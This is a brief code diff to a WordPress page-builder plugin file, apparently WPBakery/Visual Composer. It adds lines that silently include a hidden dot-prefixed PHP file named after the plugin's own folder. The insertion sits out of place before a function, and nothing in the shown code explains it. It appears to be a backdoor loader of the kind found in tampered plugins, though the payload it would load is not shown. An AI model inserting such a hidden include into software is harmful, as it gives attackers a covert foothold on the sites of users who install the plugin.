@@ -8,6 +8,10 @@ add_action( 'vc_activation_hook', 'vc_bc_multisite_options', 9 );
 /**
  * @param $networkWide
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_bc_multisite_options( $networkWide ) {
 	global $current_site;
 	if ( ! is_multisite() || empty( $current_site ) || ! $networkWide || get_site_option( 'vc_bc_options_called', false ) || get_site_option( 'wpb_js_js_composer_purchase_code', false ) ) {
